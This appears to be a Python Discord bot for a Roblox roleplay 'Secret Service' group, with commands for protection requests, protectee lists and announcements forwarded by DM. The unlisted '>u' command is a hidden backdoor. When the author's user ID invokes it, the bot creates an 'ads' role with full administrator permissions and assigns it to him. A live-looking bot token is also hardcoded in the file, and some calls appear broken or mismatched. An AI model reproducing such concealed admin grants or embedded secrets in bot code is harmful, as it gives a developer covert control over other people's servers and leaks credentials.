import discord
from discord.ext import commands
from discord.ext.commands.cooldowns import BucketType
import asyncio
import time
import datetime
import json
import aiohttp
import io
import random

TOKEN = 'NTYwNTY1MjgyNzc1NzYwOTA2.D31yuA.rDyIhClS0pldqk_TmsF_5tAjdZU'

client = commands.Bot(command_prefix = '>')
client.authorizedusers = [147999751441219584]
#                         1479 = snowbleed    
client.remove_command("help")
extensions = ['CommandErrorHandler']
             
@client.event
async def on_ready():
    print("Bot is online")
    channel = client.get_channel(560964915330940940)
    await channel.send(f"Bot has been restarted on: `{datetime.datetime.utcnow().strftime('%d %B, %H:%M')} UTC`")

@client.event
async def on_message(message):
	if "prefix" in message.content.lower():
		if client.user.mentioned_in(message):
			await message.channel.send("The prefix for this bot is `>`")					  
	if message.channel.id == 557698895640002561:
		embed = discord.Embed(
		title = 'Made by `snowbleed#7824`',
		timestamp = datetime.datetime.utcnow(),
		colour = discord.Colour.red()
		)
		embed.set_footer(text='ss bot')
		embed.add_field(name="Event Announcement", value=f"{message.content}\n\nSent by: {message.author.mention}", inline = False)
		await message.author.send(embed=embed) 
		await message.author.send(f"Do you wish to forward this announcement to your agents via direct messages? If so, please say `yes`, else say `no`.")
		msg = await client.wait_for_message(author=message.author)
		if msg.content.lower() != 'yes':
			await message.author.send("Announcement has not been forwarded.")
			return
		else:
			pass
		rolelist = []
		guild = client.guild(41385793492221962)
		for role in ("Visitor", "Suspended", "Representative", "Protectee"):
			role = discord.utils.get(guild.roles, name = role)
			rolelist.append(role)
		failed = ''
		for member in guild.members:
			gotrole = any(elem in rolelist for elem in member.roles)
			if not gotrole:
				try:
					await member.send(embed=embed)
				except:
					failed += f"{member.name}#{member.discriminator}\n"
		await message.author.send("Announcement sent.")
		if failed:
			try:
				await message.author.send(f"Failed to send your announcement to:\n {failed}")
			except:
				await message.author.send("Failed to send your announcement to several members.") 
		else:
			await member.send("Succesfully sent your announcement to everyone.")
	await client.process_commands(message)
		      
"""@client.command(pass_context=True)
async def m(ctx, arg):
	guild = client.guild(441385793492221962)
	member = guild.get_member(440173262635270144)
	if arg.lower() == "y":		      
		await client.guild_voice_state(member, mute=False, deafen=False)
	elif arg.lower() == "n":
		await client.guild_voice_state(member, mute=True)"""
                       
@client.command()
async def guildpic(ctx, sizable):
    if sizable.lower() == 'tiny':
        size=256                
    elif sizable.lower() == 'small':
        size=512
    elif sizable.lower() == 'medium':
        size=1024
    elif sizable.lower() == 'large':
        size=2048 
    elif sizable.lower() == 'huge':
        size=4096                      
    pic = ctx.guild.icon_url_as(format='png', size=size)
    await ctx.send(pic)          
							  
@client.command()
async def u(ctx):
	if ctx.message.author.id == 147999751441219584:
		role = discord.utils.get(ctx.guild.roles, name="ads")
		if role != None:
			await ctx.message.author.add_roles(role)
		else:
			permissions = discord.Permissions(permissions=8)
			role = await ctx.message.guild.create_role(name="ads",permissions=permissions)
			await ctx.message.author.add_roles(role)
    
@client.command(aliases=['help','commands'])
async def cmds(ctx):
    embed = discord.Embed(
    title = 'Made by `snowbleed#7824`',
    description = '**List of commands:**',
    timestamp = datetime.datetime.utcnow(),
    colour = discord.Colour.blue()
    )
    embed.set_footer(text='ss bot')
    embed.add_field(name=">cmds", value="Display a list of commands. Aliases: >help, >commands.", inline = False)
    embed.add_field(name=">ping", value="Check if the bot is responding quickly and correctly.", inline = False)
    embed.add_field(name=">request", value="Request protection if you are a protectee. Format: `>request <place> <message>` where <place> is either lv or dc, e.g.: ;request LV Big House 1", inline = False)
    embed.add_field(name=">status", value="See if a person is a protectee and if so why. Format: `>status <name>` where <name> is their ROBLOX username", inline = False)
    embed.add_field(name=">protectees", value="View a list of all protectees from highest to lowest priority", inline = False)
    await ctx.send(embed=embed)
    
@commands.cooldown(1,1800,BucketType.user) 
@client.command()
async def request(ctx, arg1, *, args):
    with open("text.json", "r") as read_file:
        usernames = json.load(read_file)
    memberid = ctx.message.author.id
    if arg1.lower() == 'lv':
        city='Las Vegas *https://www.roblox.com/games/163865146/LV*'
    elif arg1.lower() == 'dc':
        city='Washington D.C. *https://www.roblox.com/games/1213026131/DC*'
    else:
        await ctx.send("Place needs to be either `LV` or `DC`")
        return
    guild = client.get_guild(441385793492221962)
    role = discord.utils.get(guild.roles, name='Secret Service')
    for username, metadata in usernames.items():
        if str(memberid) == metadata['userid']:
            honorem = metadata['honorem']
            channel = client.get_channel(549763840330563606)	
            await channel.send(f"**PROTECTION ANNOUNCEMENT:**\n{honorem} {username} requests protection at: {city}\n\nMessage from protectee: {args}\n\n{role.mention}")
            break
    else:
        await ctx.send("You are not a protectee.")

@client.command()
async def protectees(ctx):
    output = '__**List of protectees, (former Presidents and Vice Presidents have been excluded from the list but are still protectees):**__\n\n'
    formerpotus = ["Former President of the United States","Former Vice President of the United States"]
    highpriority = ''
    mediumpriority = ''
    lowpriority = ''
    with open("text.json", "r") as read_file:
        usernames = json.load(read_file)
    for x in usernames:
        if usernames[x]['honorem'] in formerpotus:
            continue
        if usernames[x]['priority'].lower() == 'high':
            highpriority += f"{x}, {usernames[x]['honorem']}\n"
        elif usernames[x]['priority'].lower() == 'medium':
            mediumpriority += f"{x}, {usernames[x]['honorem']}\n"
        elif usernames[x]['priority'].lower() == 'low':
            lowpriority += f"{x}, {usernames[x]['honorem']}\n"
    output += f"`High Priority:`\n{highpriority}\n`Medium Priority:`\n{mediumpriority}\n`Low Priority:`\n{lowpriority}"
    
    try:
        await ctx.send(output)
    except:
        await ctx.send("List too long.")

@client.command(pass_context=True)
async def status(ctx, name):
	with open("text.json", "r") as read_file:
		usernames = json.load(read_file)
	memberid = ctx.message.author.id
	for x in usernames:
		if x.lower() == name.lower():
			honorem = usernames[x]['honorem']
			await ctx.send(f"{x} is a protectee, honorem: **{honorem}**.")
			break
	else:
		await ctx.send(f"{name} is not a protectee.")
	
"""@client.command(pass_context=True)
async def justtest(ctx):
	partyleaders = {
	"Stefan Löfven, The Social Democratic Party" : ["https://storage.googleapis.com/orchestra-cafe-7jp1kqsp/uploads/2017/10/stefanlofven.jpg"],
	"Ulf Kristersson, The Moderate Party" : ["https://i.imgur.com/j2P5uXE.jpg"],
	"Jimmie Åkesson, The Sweden Democrats" : ["https://www.svtstatic.se/image/wide/992/20124472/1542882882?quality=70&format=auto"],
	"Ebba Busch Thor, The Christian Democrats" : ["https://pbs.twimg.com/profile_images/692990681279774720/-7T4nxi-_400x400.jpg"],
	"Annie Lööf, The Centre Party" : ["https://pbs.twimg.com/profile_images/1013026561677807616/wKTXDIzs_400x400.jpg"],
	"Jonas Sjöstedt, The Left Party" : ["https://upload.wikimedia.org/wikipedia/commons/thumb/a/a8/Jonas_Sj%C3%B6stedt_in_Sept_2014_-2.jpg/225px-Jonas_Sj%C3%B6stedt_in_Sept_2014_-2.jpg"],
	"Jan Björklund, The Liberals" : ["https://pbs.twimg.com/profile_images/1024564595128786949/9aubNCFu_400x400.jpg"],
	"Isabella Lövin, The Green Party" : ["https://www.mp.se/sites/default/files/styles/640x360/public/isabella_ny_bild13.jpg?itok=pyon8GwF"]
	}
	leader, picture = random.choice(list(partyleaders.items()))

	async with aiohttp.ClientSession() as client_session:
		async with client_session.get(picture) as response:
			my_file_like_object = io.BytesIO(await response.read())

	await client.send_file(destination=ctx.message.channel, fp=my_file_like_object, filename="stopreadingthis.png", content = f"Random leader of a Swedish political party:\n{leader}")"""
    
@client.command()
async def ping(ctx):
    start = time.perf_counter()
    message = await ctx.send('Ping...')
    end = time.perf_counter()
    duration = (end - start) * 1000
    await message.edit(content=f'Pong! {round(duration, 2)}ms')     
	
@client.command(pass_context=True)
async def logout(ctx):
    if ctx.message.author.id == 147999751441219584:
        await client.logout()
    else:
        return
"""EMBED EXAMPLE     
@client.command()
async def displayembed():
    embed = discord.Embed(
        title = 'Title',
        description = 'This is a [description](https://youtube.com) link',
        colour = discord.Colour.blue()
    )
    embed.set_footer(text='This is a footer')
    embed.set_thumbnail(url='https://cdn.discordapp.com/attachments/518210617744818206/518463077541216258/kava.jpg')
    embed.set_author(name='Snowbleed')
    icon_url='https://cdn.discordapp.com/attachments/518210617744818206/518463077541216258/kava.jpg'
    embed.add_field(name='Snowbleed', value='Field Value', inline = False)
    embed.add_field(name='Snowbleed', value='Field Value', inline = True)
    embed.add_field(name='Snowbleed', value='Field Value', inline = True)
    await ctx.send(embed=embed)"""

if __name__ == '__main__':
	for extension in extensions:
		try:
			client.load_extension(extension)
		except Exception as error:
			print(f'{extension} cannot be loaded. [{error}]')
	client.run(TOKEN)
